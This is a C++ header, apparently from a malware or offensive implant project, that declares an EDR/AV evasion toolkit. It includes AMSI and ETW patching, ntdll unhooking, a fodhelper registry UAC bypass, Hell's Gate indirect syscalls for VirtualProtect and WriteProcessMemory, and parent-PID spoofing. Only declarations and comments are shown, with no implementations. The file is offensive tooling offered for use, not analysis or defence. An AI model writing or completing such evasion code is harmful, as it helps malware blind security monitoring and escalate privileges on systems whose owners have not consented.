// ============================================================================
// evasion.h — EDR/AV Evasion Techniques
// ============================================================================
// Contains:
//   1. AMSI BYPASS — Patch AmsiScanBuffer to return AMSI_RESULT_CLEAN
//   2. ETW BYPASS — Patch EtwEventWrite to drop all telemetry
//   3. SYSCALL UNHOOKING — Restore clean ntdll from disk
//   4. UAC BYPASS — fodhelper.exe registry hijack
//   5. INDIRECT SYSCALL (Hell's Gate) — bypass userland EDR hooks
// ============================================================================
#pragma once

#ifdef _WIN32
#include <windows.h>
#include <winternl.h>
#endif

#include <string>
#include <cstring>
#include <random>

#include "obfuscation.h"
#include "api_table.h"

// ============================================================================
// AMSI BYPASS
// ============================================================================
#ifdef _WIN32
void patchAmsi();
#else
inline void patchAmsi() {}
#endif

// ============================================================================
// ETW BYPASS
// ============================================================================
#ifdef _WIN32
void patchETW();
#else
inline void patchETW() {}
#endif

// ============================================================================
// SYSCALL UNHOOKING - Restore clean ntdll.dll from disk
// ============================================================================
#ifdef _WIN32
void unhookNtdll();
#else
inline void unhookNtdll() {}
#endif

// ============================================================================
// UAC BYPASS - fodhelper.exe Registry Hijack (No Admin Required)
// ============================================================================
#ifdef _WIN32
void bypassUac(const std::string& command_to_execute = "");
#else
inline void bypassUac(const std::string& = "") {}
#endif

// ============================================================================
// HELL'S GATE - Indirect Syscall Execution
// ============================================================================
// Resolves syscall numbers from clean ntdll on disk at runtime.
// Builds executable stubs that jump to ntdll's existing syscall;ret
// instruction instead of executing syscall from our own memory.
// ============================================================================
#ifdef _WIN32

// Indirect syscall stub size
// Indirect syscall stub size (64 bytes = room for stack spoofing instructions)
#define INDIRECT_STUB_SIZE 64

// Global indirect syscall buffers
extern unsigned char g_indirect_stub_protect_vm[INDIRECT_STUB_SIZE];
extern unsigned char g_indirect_stub_write_vm[INDIRECT_STUB_SIZE];
extern bool g_indirect_initialized;
extern void* g_ntdll_syscall_ret;

// Initialize INDIRECT Syscall
bool initIndirectSyscall();

// Indirect VirtualProtect — bypasses all ntdll EDR hooks
bool virtualProtectDirect(LPVOID address, SIZE_T size, DWORD newProtect, PDWORD oldProtect);

// Indirect WriteProcessMemory — bypasses all ntdll EDR hooks
bool writeMemoryDirect(HANDLE hProcess, LPVOID baseAddress, LPCVOID buffer,
                       SIZE_T size, SIZE_T* bytesWritten);

// ============================================================================
// HOOK DETECTION — Check if ntdll .text section has been modified by EDR
// Returns true if hooks detected (functions differ from disk copy)
// ============================================================================
bool isNtdllHooked();

// ============================================================================
// DEEPER ETW PATCHING — Also patch NtTraceEvent + EtwEventWriteTransfer
// ============================================================================
void patchEtwDeep();

// ============================================================================
// PARENT PID SPOOFING — Create process with spoofed parent
// ============================================================================
bool createProcessWithSpoofedParent(LPCSTR lpApplicationName, LPSTR lpCommandLine,
                                     DWORD dwParentPID, LPPROCESS_INFORMATION lpProcessInformation);

#else
inline bool initIndirectSyscall() { return false; }
#endif // _WIN32
